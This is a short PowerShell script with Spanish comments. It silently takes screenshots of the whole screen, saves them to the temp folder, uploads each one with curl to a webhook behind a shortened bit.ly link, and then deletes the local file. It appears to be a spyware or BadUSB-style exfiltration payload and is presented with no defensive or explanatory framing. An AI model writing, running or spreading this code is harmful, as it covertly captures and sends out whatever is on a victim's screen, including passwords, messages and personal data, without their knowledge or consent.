$hookurl = "https://bit.ly/web_chupakbras"
$seconds = 30 # Intervalo entre capturas de pantalla
$a = 1 # Cantidad de capturas de pantalla

# Detección de URL acortada
if ($hookurl.Ln -ne 121){Write-Host "Se detectó una URL de Webhook acortada.." ; $hookurl = (irm $hookurl).url}

$counter = 1

While ($a -gt 0){
    $Filett = "$env:temp\SC$counter.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $filett
    Start-Sleep $seconds
    $a--
    $counter++
}